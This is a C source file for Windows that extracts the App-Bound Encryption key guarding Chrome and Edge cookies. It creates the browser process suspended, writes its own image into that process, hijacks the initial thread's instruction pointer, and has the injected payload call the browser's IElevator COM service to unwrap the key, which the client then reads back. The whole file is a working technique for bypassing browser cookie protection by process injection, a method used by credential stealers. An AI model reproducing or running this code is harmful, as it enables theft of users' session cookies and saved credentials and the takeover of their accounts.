/*
 * AbeKey.c - Chromium App-Bound Encryption master key acquisition.
 *
 * Mechanism (single file, no shellcode, no DLL injection into the target):
 *   1. CreateProcessInternalW(browser, suspended) - no browser code ever runs.
 *      The KernelBase primitive builds a complete parameter block (desktop,
 *      environment) which hand-rolled RTL_USER_PROCESS_PARAMETERS lack.
 *   2. Map our own PE image into the target (memory copy + base relocations +
 *      per-section page protections + instruction cache flush via NT
 *      syscalls). The input request block is patched into the staging copy,
 *      so the payload needs no arguments. Our IAT entries for ntdll keep
 *      their absolute addresses: ntdll is mapped at the same base in every
 *      process of a boot session, and the loader resolved them already. The
 *      payload resolves its COM entry points at run time through
 *      LoadLibraryW/GetProcAddress.
 *   3. NtSetContextThread: redirect the initial thread RIP (x64) / PC (ARM64*)
 *      to ZpAbe_PayloadEntry - a zero-argument function, because the initial
 *      thread context does not deliver argument registers. The loader's
 *      LdrInitializeThunk APC still runs first, so the entry executes in a
 *      fully initialized process.
 *   4. Payload extracts the APPB blob from the Local State copy and unwraps
 *      the key through the browser's IElevator COM service (path validation
 *      passes: the host exe is the real browser). The standard marshaler
 *      proxy comes from the browser's own machine registration only; this
 *      code never touches the registry and fails closed when the vendor
 *      registration is missing.
 *   5. Results are published to volatile globals inside the mapped image and
 *      the payload then parks forever: the process must stay alive until the
 *      client has read the results (a terminated process cannot be read
 *      back). The client polls with NtReadVirtualMemory and reaps the
 *      process; the mapped image dies with the address space - freeing it
 *      remotely while the payload thread may still be running is not safe.
 *
 * Concurrency: one in-flight acquisition per browser (single-flight). The
 * leader runs the expensive phase outside the entry lock and publishes
 * success or a short-lived failure; concurrent callers wait on an NT event
 * and share the leader's result. The cache identity is the SHA-256 of the
 * app_bound_encrypted_key ciphertext, so unrelated Local State rewrites do
 * not invalidate it, while an actual re-wrap does.
 *
 * Browser elevator generations (verified on Edge 151 / Chrome 152):
 *   Edge:   IElevatorEdge {C9C2B807-...} : IElevatorEdgeBase(3) + IElevator,
 *           DecryptData at vtable slot 8.
 *   Chrome: IElevator2Chrome {1BF5208B-...} : IElevator2 : IElevator,
 *           DecryptData at vtable slot 5.
 *
 * Accepted risk (owner decision): the browser image is resolved from the
 * vendor's install locations, including the documented per-user
 * %LOCALAPPDATA% layout, and inherits the client token without signature,
 * architecture or token checks - a tampered per-user browser install already
 * implies a compromised user environment.
 *
 * Architecture: x64 and ARM64/ARM64EC (ARM64EC threads report the ARM64
 * register context while executing native code, so both use CONTEXT.Pc).
 * x86 is not supported and fails fast.
 */

#include <KNSoft/NDK/NDK.h>
#include <strsafe.h>
#include <bcrypt.h>

#pragma warning(disable: 4152) /* classic GetProcAddress idiom */
#pragma comment(lib, "KNSoft.NDK.WinAPI.lib")

#define ZP_ABE_EDGE             0
#define ZP_ABE_CHROME           1

#define ZP_ABE_LOCAL_STATE_MAX  (1024 * 1024)
#define ZP_ABE_POLL_SLACK_MS    15
#define ZP_ABE_POLL_COUNT       1000
#define ZP_ABE_WAIT_SLACK_MS    20000
#define ZP_ABE_FAILURE_RETRY_MS 5000

typedef struct _ZP_ABE_BROWSER
{
    GUID Clsid;
    GUID Iid;
    ULONG DecryptSlot;     /* IElevator::DecryptData vtable slot */
    PCWSTR Vendor;
    PCWSTR ExeName;
} ZP_ABE_BROWSER;

static const ZP_ABE_BROWSER ZpAbeBrowsers[] = {
    { {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
      {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
      8, L"Microsoft\\Edge", L"msedge.exe" },
    { {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
      {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}},
      5, L"Google\\Chrome", L"chrome.exe" },
};

#if defined(_M_IX86)

NTSTATUS
ZpAbeAcquireCookieKey(
    _In_ DWORD Browser,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_opt_ PULONG ResultCode)
{
    (VOID)Browser;
    (VOID)Key;
    if (ResultCode != NULL) *ResultCode = (ULONG)STATUS_NOT_SUPPORTED;
    return STATUS_NOT_SUPPORTED;
}

#else

/* ---- payload: executes inside the loader-initialized browser process ----
 * No CRT state (CRT init never ran there): only intrinsics, in-image pure CRT
 * helpers and dynamically resolved COM entry points. Never returns and never
 * exits the process: the client must be able to read the results, so it stays
 * parked until the client reaps it. */

typedef struct _ZP_ABE_REQUEST
{
    ULONG Browser;
    ULONG LocalStateLength;
    BYTE LocalState[ZP_ABE_LOCAL_STATE_MAX];
} ZP_ABE_REQUEST;

static ZP_ABE_REQUEST ZpAbe_Request;

static volatile LONG ZpAbe_Pending; /* 0 = running, 1 = finished */
static volatile LONG ZpAbe_Code = (LONG)0x80004005L /* E_FAIL */;
static volatile BYTE ZpAbe_Key[32];

typedef HRESULT (WINAPI *ZP_ABE_DECRYPT_DATA)(PVOID, BSTR, BSTR*, DWORD*);

static VOID
ZpAbe_PayloadEntry(VOID)
{
    static const CHAR Tag[] = "\"app_bound_encrypted_key\":\"";
    static BYTE Blob[2048];
    const ZP_ABE_BROWSER* Browser = NULL;
    LONG Code = (LONG)0x80004005L;
    HRESULT (WINAPI *CoInitializeExFn)(PVOID, DWORD);
    HRESULT (WINAPI *CoCreateInstanceFn)(const GUID*, PVOID, DWORD, const GUID*, PVOID*);
    HRESULT (WINAPI *CoSetProxyBlanketFn)(PVOID, DWORD, DWORD, PCWSTR, DWORD, DWORD, PVOID, DWORD);
    VOID (WINAPI *CoUninitializeFn)(VOID);
    BSTR (WINAPI *SysAllocStringByteLenFn)(PCSTR, UINT);
    UINT (WINAPI *SysStringByteLenFn)(BSTR);
    VOID (WINAPI *SysFreeStringFn)(BSTR);
    BOOL (WINAPI *CryptStringToBinaryFn)(PCSTR, DWORD, DWORD, PBYTE, DWORD*, DWORD*, DWORD*);
    PCSTR Base64 = NULL;
    PVOID Elevator = NULL;
    BSTR In = NULL, Out = NULL;
    ULONG Index, Base64Length = 0, TagLength = sizeof(Tag) - 1, BlobLength = 0;
    HRESULT Hr = E_FAIL;

    if (ZpAbe_Request.Browser < ARRAYSIZE(ZpAbeBrowsers)) Browser = &ZpAbeBrowsers[ZpAbe_Request.Browser];
    if (Browser != NULL)
    {
        for (Index = 0; Index + TagLength <= ZpAbe_Request.LocalStateLength; Index++)
        {
            if (ZpAbe_Request.LocalState[Index] == Tag[0] &&
                memcmp(ZpAbe_Request.LocalState + Index, Tag, TagLength) == 0)
            {
                Base64 = (PCSTR)ZpAbe_Request.LocalState + Index + TagLength;
                break;
            }
        }
        if (Base64 != NULL)
        {
            ULONG Remaining = ZpAbe_Request.LocalStateLength -
                              (ULONG)((PBYTE)Base64 - (PBYTE)ZpAbe_Request.LocalState);
            ULONG Limit = min(8192U, Remaining);

            while (Base64Length < Limit && Base64[Base64Length] != '"') Base64Length++;
        }
        CryptStringToBinaryFn = (PVOID)GetProcAddress(LoadLibraryW(L"crypt32.dll"),
                                                      "CryptStringToBinaryA");
        BlobLength = sizeof(Blob);
        if (Base64 != NULL &&
            Base64Length != 0 &&
            CryptStringToBinaryFn != NULL &&
            CryptStringToBinaryFn(Base64,
                                  Base64Length,
                                  CRYPT_STRING_BASE64,
                                  Blob,
                                  &BlobLength,
                                  NULL,
                                  NULL) &&
            BlobLength > 4 &&
            memcmp(Blob, "APPB", 4) == 0)
        {
            if ((CoInitializeExFn = (PVOID)GetProcAddress(LoadLibraryW(L"ole32.dll"), "CoInitializeEx")) != NULL &&
                (CoCreateInstanceFn = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoCreateInstance")) != NULL &&
                (CoSetProxyBlanketFn = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoSetProxyBlanket")) != NULL &&
                (CoUninitializeFn = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoUninitialize")) != NULL &&
                (SysAllocStringByteLenFn = (PVOID)GetProcAddress(LoadLibraryW(L"oleaut32.dll"), "SysAllocStringByteLen")) != NULL &&
                (SysStringByteLenFn = (PVOID)GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysStringByteLen")) != NULL &&
                (SysFreeStringFn = (PVOID)GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysFreeString")) != NULL)
            {
                Hr = CoInitializeExFn(NULL, COINIT_APARTMENTTHREADED);
                if (SUCCEEDED(Hr))
                {
                    DWORD LastError = 0;

                    Hr = CoCreateInstanceFn(&Browser->Clsid,
                                            NULL,
                                            CLSCTX_LOCAL_SERVER,
                                            &Browser->Iid,
                                            &Elevator);
                    if (SUCCEEDED(Hr))
                    {
                        Hr = CoSetProxyBlanketFn(Elevator,
                                                 RPC_C_AUTHN_DEFAULT,
                                                 RPC_C_AUTHZ_DEFAULT,
                                                 NULL,
                                                 RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                                 RPC_C_IMP_LEVEL_IMPERSONATE,
                                                 NULL,
                                                 EOAC_DYNAMIC_CLOAKING);
                        if (SUCCEEDED(Hr))
                        {
                            In = SysAllocStringByteLenFn((PCSTR)Blob + 4, BlobLength - 4);
                            Hr = In != NULL ?
                                     ((ZP_ABE_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
                                         Elevator, In, &Out, &LastError) :
                                     E_OUTOFMEMORY;
                            if (SUCCEEDED(Hr))
                            {
                                if (Out != NULL && SysStringByteLenFn(Out) == 32)
                                {
                                    RtlCopyMemory((PVOID)ZpAbe_Key, Out, 32);
                                    Code = 0;
                                }
                                else
                                {
                                    Hr = E_UNEXPECTED;
                                }
                            }
                            if (Out != NULL) SysFreeStringFn(Out);
                            if (In != NULL) SysFreeStringFn(In);
                        }
                        ((ULONG (WINAPI*)(PVOID))((*(PVOID**)Elevator)[2]))(Elevator);
                    }
                    CoUninitializeFn();
                }
            }
        }
    }
    if (Code != 0) Code = (LONG)Hr;
    ZpAbe_Code = Code;
    _InterlockedExchange(&ZpAbe_Pending, 1);
    /* park until the client reaps the process: exiting would destroy the
     * address space before the results have been read */
    for (;;)
    {
        LARGE_INTEGER Delay;

        Delay.QuadPart = -(LONGLONG)1000 * 10000;
        NtDelayExecution(FALSE, &Delay);
    }
}

/* ---- client side ---- */

/* per-browser single-flight cache: Empty -> Loading -> Ready/Failed; waiters
 * block on the notification event and share the leader's result; failures are
 * retryable after a short cooldown; identity is the SHA-256 of the
 * app_bound_encrypted_key ciphertext */

typedef struct _ZP_ABE_CACHE_ENTRY
{
    LONG Lock;
    HANDLE Changed;
    LONG State;         /* 0 = empty, 1 = loading, 2 = ready, 3 = failed */
    BYTE BlobHash[32];
    BYTE Key[32];
    LONG Status;
    LONG Result;
    ULONGLONG RetryTime;
} ZP_ABE_CACHE_ENTRY;

static ZP_ABE_CACHE_ENTRY ZpAbe_Cache[ARRAYSIZE(ZpAbeBrowsers)];
static LONG ZpAbe_CacheInit; /* 0 = uninitialized, 1 = initializing, 2 = ready */

static
NTSTATUS
ZpAbeEnsureCache(VOID)
{
    NTSTATUS Status = STATUS_SUCCESS;

    if (ZpAbe_CacheInit == 2) return STATUS_SUCCESS;
    if (_InterlockedCompareExchange(&ZpAbe_CacheInit, 1, 0) == 0)
    {
        ULONG Index;

        for (Index = 0; Index < ARRAYSIZE(ZpAbe_Cache); Index++)
        {
            Status = NtCreateEvent(&ZpAbe_Cache[Index].Changed,
                                   EVENT_QUERY_STATE | EVENT_MODIFY_STATE,
                                   NULL,
                                   NotificationEvent,
                                   FALSE);
            if (!NT_SUCCESS(Status)) break;
        }
        _InterlockedExchange(&ZpAbe_CacheInit, NT_SUCCESS(Status) ? 2 : 0);
    }
    else
    {
        LARGE_INTEGER Delay;

        Delay.QuadPart = -(LONGLONG)10000;
        while (ZpAbe_CacheInit == 1) NtDelayExecution(FALSE, &Delay);
        if (ZpAbe_CacheInit != 2) Status = STATUS_UNSUCCESSFUL;
    }
    return Status;
}

static
VOID
ZpAbeAcquireEntry(
    _Inout_ ZP_ABE_CACHE_ENTRY* Entry)
{
    LARGE_INTEGER Delay;

    Delay.QuadPart = -(LONGLONG)10000; /* 1 ms */
    while (_InterlockedCompareExchange(&Entry->Lock, 1, 0) != 0)
    {
        NtDelayExecution(FALSE, &Delay);
    }
}

static
VOID
ZpAbeReleaseEntry(
    _Inout_ ZP_ABE_CACHE_ENTRY* Entry)
{
    _InterlockedExchange(&Entry->Lock, 0);
}

static
NTSTATUS
ZpAbeHashSha256(
    _In_reads_bytes_(Length) const BYTE* Data,
    _In_ ULONG Length,
    _Out_writes_bytes_(32) BYTE Digest[32])
{
    BCRYPT_ALG_HANDLE Algorithm = NULL;
    NTSTATUS Status;

    Status = BCryptOpenAlgorithmProvider(&Algorithm, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (NT_SUCCESS(Status))
    {
        Status = BCryptHash(Algorithm, NULL, 0, (PUCHAR)Data, Length, Digest, 32);
        BCryptCloseAlgorithmProvider(Algorithm, 0);
    }
    return Status;
}

static
BOOLEAN
ZpAbeFindBlobSpan(
    _In_reads_bytes_(Length) const BYTE* Text,
    _In_ ULONG Length,
    _Out_ PULONG Offset,
    _Out_ PULONG SpanLength)
{
    static const CHAR Tag[] = "\"app_bound_encrypted_key\":\"";
    ULONG TagLength = sizeof(Tag) - 1, Index, Limit;

    if (Length <= TagLength) return FALSE;
    Limit = Length - TagLength;
    for (Index = 0; Index <= Limit; Index++)
    {
        if (Text[Index] == Tag[0] && memcmp(Text + Index, Tag, TagLength) == 0)
        {
            ULONG Begin = Index + TagLength, End = Begin;

            while (End < Length && Text[End] != '"') End++;
            if (End > Begin && End - Begin <= 8192)
            {
                *Offset = Begin;
                *SpanLength = End - Begin;
                return TRUE;
            }
            return FALSE;
        }
    }
    return FALSE;
}

static
NTSTATUS
ZpAbeQueryEnvironment(
    _In_z_ PCWSTR Name,
    _Out_writes_z_(Capacity) PWSTR Value,
    _In_ ULONG Capacity)
{
    UNICODE_STRING NameString, ValueString;

    RtlInitUnicodeString(&NameString, Name);
    ValueString.Buffer = Value;
    ValueString.Length = 0;
    ValueString.MaximumLength = (USHORT)min(Capacity * sizeof(WCHAR), MAXUSHORT);
    return RtlQueryEnvironmentVariable_U(NULL, &NameString, &ValueString);
}

static
BOOLEAN
ZpAbeGetPaths(
    _In_ DWORD Browser,
    _Out_writes_(MAX_PATH) PWSTR Executable,
    _Out_writes_(MAX_PATH) PWSTR LocalState)
{
    static const PCWSTR Names[3] = { L"LOCALAPPDATA", L"ProgramFiles", L"ProgramFiles(x86)" };
    WCHAR Environment[MAX_PATH];
    ULONG Index;

    LocalState[0] = UNICODE_NULL;
    for (Index = 0; Index < ARRAYSIZE(Names); Index++)
    {
        if (!NT_SUCCESS(ZpAbeQueryEnvironment(Names[Index], Environment, MAX_PATH))) continue;
        if (Index == 0 &&
            FAILED(StringCchPrintfW(LocalState,
                                    MAX_PATH,
                                    L"%s\\%s\\User Data\\Local State",
                                    Environment,
                                    ZpAbeBrowsers[Browser].Vendor)))
        {
            return FALSE;
        }
        if (FAILED(StringCchPrintfW(Executable,
                                    MAX_PATH,
                                    L"%s\\%s\\Application\\%s",
                                    Environment,
                                    ZpAbeBrowsers[Browser].Vendor,
                                    ZpAbeBrowsers[Browser].ExeName)))
        {
            continue;
        }
        if (GetFileAttributesW(Executable) != INVALID_FILE_ATTRIBUTES &&
            LocalState[0] != UNICODE_NULL)
        {
            return TRUE;
        }
    }
    return FALSE;
}

static
NTSTATUS
ZpAbeReadFile(
    _In_ PCWSTR Path,
    _Out_writes_bytes_(Capacity) PBYTE Buffer,
    _In_ ULONG Capacity,
    _Out_ PULONG Length)
{
    UNICODE_STRING NtPath;
    OBJECT_ATTRIBUTES Object;
    IO_STATUS_BLOCK IoStatus;
    FILE_STANDARD_INFORMATION Standard;
    HANDLE File;
    ULONG Total = 0;
    NTSTATUS Status;

    *Length = 0;
    Status = RtlDosPathNameToNtPathName_U_WithStatus(Path, &NtPath, NULL, NULL);
    if (!NT_SUCCESS(Status)) return Status;
    InitializeObjectAttributes(&Object, &NtPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    Status = NtOpenFile(&File,
                        FILE_READ_DATA | SYNCHRONIZE,
                        &Object,
                        &IoStatus,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
    RtlFreeUnicodeString(&NtPath);
    if (!NT_SUCCESS(Status)) return Status;
    Status = NtQueryInformationFile(File,
                                    &IoStatus,
                                    &Standard,
                                    sizeof(Standard),
                                    FileStandardInformation);
    if (NT_SUCCESS(Status) &&
        (Standard.EndOfFile.QuadPart <= 0 || Standard.EndOfFile.QuadPart > (LONGLONG)Capacity))
    {
        Status = Standard.EndOfFile.QuadPart > 0 ? STATUS_BUFFER_TOO_SMALL : STATUS_UNSUCCESSFUL;
    }
    while (NT_SUCCESS(Status) && Total < (ULONGLONG)Standard.EndOfFile.QuadPart)
    {
        Status = NtReadFile(File,
                            NULL,
                            NULL,
                            NULL,
                            &IoStatus,
                            Buffer + Total,
                            (ULONG)Standard.EndOfFile.QuadPart - Total,
                            NULL,
                            NULL);
        if (NT_SUCCESS(Status))
        {
            if (IoStatus.Information == 0)
            {
                Status = STATUS_UNSUCCESSFUL;
                break;
            }
            Total += (ULONG)IoStatus.Information;
        }
    }
    NtClose(File);
    if (NT_SUCCESS(Status)) *Length = Total;
    return Status;
}

static
NTSTATUS
ZpAbeMapSelf(
    _In_ HANDLE Process,
    _In_reads_bytes_(RequestLength) PVOID Request,
    _In_ ULONG RequestLength,
    _Out_ PVOID* Mapped)
{
    PBYTE Self = (PBYTE)GetModuleHandleW(NULL);
    IMAGE_NT_HEADERS* Nt = RtlImageNtHeader(Self);
    IMAGE_SECTION_HEADER* Section;
    IMAGE_BASE_RELOCATION* Reloc;
    PUSHORT Entry;
    PBYTE Copy = NULL;
    PVOID Base = NULL;
    SIZE_T RegionSize, ZeroSize = 0;
    ULONG Size, Remaining, BlockSize, Count, Index, Old;
    ULONG64 Delta;
    NTSTATUS Status = STATUS_SUCCESS;

    *Mapped = NULL;
    if (Nt == NULL ||
        Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0)
    {
        return STATUS_INVALID_IMAGE_FORMAT;
    }
    Size = Nt->OptionalHeader.SizeOfImage;
    RegionSize = Size;
    Status = NtAllocateVirtualMemory(NtCurrentProcess(),
                                     &Copy,
                                     0,
                                     &RegionSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (NT_SUCCESS(Status))
    {
        RegionSize = Size;
        Status = NtAllocateVirtualMemory(Process,
                                         &Base,
                                         0,
                                         &RegionSize,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
    }
    if (!NT_SUCCESS(Status))
    {
        if (Copy != NULL)
        {
            NtFreeVirtualMemory(NtCurrentProcess(), &Copy, &ZeroSize, MEM_RELEASE);
        }
        return Status;
    }
    RtlCopyMemory(Copy, Self, Size);
    Delta = (ULONG64)(ULONG_PTR)Base - (ULONG64)(ULONG_PTR)Self;
    if (Delta != 0)
    {
        Reloc = (IMAGE_BASE_RELOCATION*)(Copy +
            Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        Remaining = Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        while (NT_SUCCESS(Status) && Remaining >= sizeof(*Reloc))
        {
            BlockSize = Reloc->SizeOfBlock;
            Count = BlockSize >= sizeof(*Reloc) ? (BlockSize - sizeof(*Reloc)) / sizeof(USHORT) : 0;
            Entry = (PUSHORT)(Reloc + 1);
            if (BlockSize < sizeof(*Reloc) || BlockSize > Remaining || Count > BlockSize)
            {
                Status = STATUS_INVALID_IMAGE_FORMAT;
                break;
            }
            for (Index = 0; Index < Count; Index++)
            {
                if ((Entry[Index] >> 12) == IMAGE_REL_BASED_DIR64)
                {
                    *(ULONG64*)(Copy + Reloc->VirtualAddress + (Entry[Index] & 0xFFF)) += Delta;
                }
                else if ((Entry[Index] >> 12) != IMAGE_REL_BASED_ABSOLUTE)
                {
                    Status = STATUS_NOT_SUPPORTED;
                    break;
                }
            }
            Remaining -= BlockSize;
            Reloc = (IMAGE_BASE_RELOCATION*)((PBYTE)Reloc + BlockSize);
        }
    }
    if (NT_SUCCESS(Status) && RequestLength != 0)
    {
        RtlCopyMemory(Copy + ((ULONG64)(ULONG_PTR)&ZpAbe_Request - (ULONG64)(ULONG_PTR)Self),
                      Request,
                      RequestLength);
    }
    if (NT_SUCCESS(Status)) Status = NtWriteVirtualMemory(Process, Base, Copy, Size, NULL);
    if (NT_SUCCESS(Status))
    {
        Section = IMAGE_FIRST_SECTION(Nt);
        for (Index = 0; Index < Nt->FileHeader.NumberOfSections && NT_SUCCESS(Status); Index++)
        {
            if (Section[Index].Misc.VirtualSize != 0)
            {
                PVOID ProtectBase = (PBYTE)Base + Section[Index].VirtualAddress;
                SIZE_T ProtectSize = Section[Index].Misc.VirtualSize;
                ULONG Protect =
                    Section[Index].Characteristics & IMAGE_SCN_MEM_EXECUTE ?
                        (Section[Index].Characteristics & IMAGE_SCN_MEM_WRITE ?
                            PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ) :
                    Section[Index].Characteristics & IMAGE_SCN_MEM_WRITE ?
                        PAGE_READWRITE : PAGE_READONLY;

                Status = NtProtectVirtualMemory(Process,
                                                &ProtectBase,
                                                &ProtectSize,
                                                Protect,
                                                &Old);
            }
        }
    }
    if (NT_SUCCESS(Status))
    {
        Status = NtFlushInstructionCache(Process, Base, Size);
    }
    NtFreeVirtualMemory(NtCurrentProcess(), &Copy, &ZeroSize, MEM_RELEASE);
    if (NT_SUCCESS(Status))
    {
        *Mapped = Base;
    }
    else
    {
        NtFreeVirtualMemory(Process, &Base, &ZeroSize, MEM_RELEASE);
    }
    return Status;
}

static
NTSTATUS
ZpAbeRunAcquisition(
    _In_ PCWSTR Executable,
    _In_ PVOID Request,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_ PLONG Code)
{
    PBYTE Self = (PBYTE)GetModuleHandleW(NULL);
    STARTUPINFOW StartupInfo;
    PROCESS_INFORMATION ProcessInfo;
    LARGE_INTEGER Timeout;
    PVOID Mapped = NULL;
    LONG Pending;
    HANDLE Process, Thread;
    ULONG Index;
    NTSTATUS Status;

    ZeroMemory(&StartupInfo, sizeof(StartupInfo));
    ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
    StartupInfo.cb = sizeof(StartupInfo);
    if (!CreateProcessInternalW(NULL,
                                Executable,
                                NULL,
                                NULL,
                                NULL,
                                FALSE,
                                CREATE_SUSPENDED,
                                NULL,
                                NULL,
                                &StartupInfo,
                                &ProcessInfo,
                                NULL))
    {
        return NTSTATUS_FROM_WIN32(GetLastError());
    }
    Process = ProcessInfo.hProcess;
    Thread = ProcessInfo.hThread;
    Status = ZpAbeMapSelf(Process, Request, sizeof(ZP_ABE_REQUEST), &Mapped);
    if (NT_SUCCESS(Status))
    {
        CONTEXT Context;

        ZeroMemory(&Context, sizeof(Context));
        Context.ContextFlags = CONTEXT_CONTROL;
        Status = NtGetContextThread(Thread, &Context);
        if (NT_SUCCESS(Status))
        {
#if defined(_M_ARM64) || defined(_M_ARM64EC)
            Context.Pc = (DWORD64)(ULONG_PTR)Mapped +
                         ((ULONG64)(ULONG_PTR)ZpAbe_PayloadEntry - (ULONG64)(ULONG_PTR)Self);
#else
            Context.Rip = (DWORD64)(ULONG_PTR)Mapped +
                          ((ULONG64)(ULONG_PTR)ZpAbe_PayloadEntry - (ULONG64)(ULONG_PTR)Self);
#endif
            Status = NtSetContextThread(Thread, &Context);
        }
        if (NT_SUCCESS(Status)) Status = NtResumeThread(Thread, NULL);
    }
    if (NT_SUCCESS(Status))
    {
        Status = STATUS_TIMEOUT;
        for (Index = 0; Index < ZP_ABE_POLL_COUNT; Index++)
        {
            if (NT_SUCCESS(NtReadVirtualMemory(Process,
                                               (PBYTE)Mapped +
                                                   ((ULONG64)(ULONG_PTR)&ZpAbe_Pending -
                                                    (ULONG64)(ULONG_PTR)Self),
                                               &Pending,
                                               sizeof(Pending),
                                               NULL)) &&
                Pending != 0)
            {
                NtReadVirtualMemory(Process,
                                    (PBYTE)Mapped +
                                        ((ULONG64)(ULONG_PTR)&ZpAbe_Code -
                                         (ULONG64)(ULONG_PTR)Self),
                                    Code,
                                    sizeof(*Code),
                                    NULL);
                if (*Code == 0)
                {
                    Status = NT_SUCCESS(NtReadVirtualMemory(Process,
                                                            (PBYTE)Mapped +
                                                                ((ULONG64)(ULONG_PTR)ZpAbe_Key -
                                                                 (ULONG64)(ULONG_PTR)Self),
                                                            Key,
                                                            32,
                                                            NULL)) ?
                             STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
                }
                else
                {
                    Status = STATUS_UNSUCCESSFUL;
                }
                break;
            }
            Timeout.QuadPart = -(LONGLONG)ZP_ABE_POLL_SLACK_MS * 10000;
            if (NtWaitForSingleObject(Process, FALSE, &Timeout) == STATUS_WAIT_0)
            {
                /* the payload parks instead of exiting: an early exit means
                 * it died without publishing anything */
                Status = STATUS_UNSUCCESSFUL;
                break;
            }
        }
    }
    /* reap first, nothing else: the address space reclaims the mapped image,
     * so there is deliberately no remote free of the mapping */
    NtTerminateProcess(Process, STATUS_SUCCESS);
    Timeout.QuadPart = -(LONGLONG)3 * 1000 * 10000;
    NtWaitForSingleObject(Process, FALSE, &Timeout);
    NtClose(Thread);
    NtClose(Process);
    return Status;
}

NTSTATUS
ZpAbeAcquireCookieKey(
    _In_ DWORD Browser,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_opt_ PULONG ResultCode)
{
    ZP_ABE_CACHE_ENTRY* Entry;
    LARGE_INTEGER Timeout;
    WCHAR Executable[MAX_PATH], LocalState[MAX_PATH];
    PVOID Request = NULL;
    PBYTE Text = NULL;
    BYTE BlobHash[32];
    SIZE_T RequestSize = sizeof(ZP_ABE_REQUEST), ZeroSize = 0;
    ULONG Length = 0, Offset = 0, SpanLength = 0;
    LONG Code = (LONG)0x80004005L;
    NTSTATUS Status;

    if (ResultCode != NULL) *ResultCode = 0;
    if (Browser >= ARRAYSIZE(ZpAbeBrowsers) || Key == NULL) return STATUS_INVALID_PARAMETER;
    Entry = &ZpAbe_Cache[Browser];

    Status = ZpAbeEnsureCache();
    if (NT_SUCCESS(Status) && !ZpAbeGetPaths(Browser, Executable, LocalState))
    {
        Status = STATUS_NOT_FOUND;
    }
    if (NT_SUCCESS(Status))
    {
        Status = NtAllocateVirtualMemory(NtCurrentProcess(),
                                         &Request,
                                         0,
                                         &RequestSize,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
    }
    if (NT_SUCCESS(Status))
    {
        ((PULONG)Request)[0] = Browser;
        Text = (PBYTE)Request + FIELD_OFFSET(ZP_ABE_REQUEST, LocalState);
        Status = ZpAbeReadFile(LocalState, Text, ZP_ABE_LOCAL_STATE_MAX, &Length);
        if (NT_SUCCESS(Status)) ((PULONG)Request)[1] = Length;
    }
    if (NT_SUCCESS(Status) && !ZpAbeFindBlobSpan(Text, Length, &Offset, &SpanLength))
    {
        Status = STATUS_NOT_FOUND;
    }
    if (NT_SUCCESS(Status)) Status = ZpAbeHashSha256(Text + Offset, SpanLength, BlobHash);

    while (NT_SUCCESS(Status))
    {
        ZpAbeAcquireEntry(Entry);
        if (Entry->State >= 2 && RtlEqualMemory(Entry->BlobHash, BlobHash, sizeof(BlobHash)))
        {
            if (Entry->State == 3 && GetTickCount64() >= Entry->RetryTime)
            {
                Entry->State = 0;
            }
            else
            {
                Status = Entry->Status;
                Code = Entry->Result;
                if (Entry->State == 2) RtlCopyMemory(Key, Entry->Key, 32);
                ZpAbeReleaseEntry(Entry);
                break;
            }
        }
        if (Entry->State == 1)
        {
            ZpAbeReleaseEntry(Entry);
            Timeout.QuadPart = -(LONGLONG)ZP_ABE_WAIT_SLACK_MS * 10000;
            if (NtWaitForSingleObject(Entry->Changed, FALSE, &Timeout) == STATUS_TIMEOUT)
            {
                Status = STATUS_TIMEOUT;
                break;
            }
            continue;
        }
        Entry->State = 1;
        RtlCopyMemory(Entry->BlobHash, BlobHash, sizeof(BlobHash));
        NtResetEvent(Entry->Changed, NULL);
        ZpAbeReleaseEntry(Entry);

        /* leader: expensive phase outside the entry lock */
        Status = ZpAbeRunAcquisition(Executable, Request, Key, &Code);

        ZpAbeAcquireEntry(Entry);
        RtlSecureZeroMemory(Entry->Key, sizeof(Entry->Key));
        if (NT_SUCCESS(Status)) RtlCopyMemory(Entry->Key, Key, 32);
        Entry->Status = Status;
        Entry->Result = Code;
        Entry->State = NT_SUCCESS(Status) ? 2 : 3;
        Entry->RetryTime = NT_SUCCESS(Status) ? 0 : GetTickCount64() + ZP_ABE_FAILURE_RETRY_MS;
        NtSetEvent(Entry->Changed, NULL);
        ZpAbeReleaseEntry(Entry);
        break;
    }
    if (Request != NULL) NtFreeVirtualMemory(NtCurrentProcess(), &Request, &ZeroSize, MEM_RELEASE);
    if (ResultCode != NULL) *ResultCode = (ULONG)Code;
    return Status;
}

#endif /* !_M_IX86 */
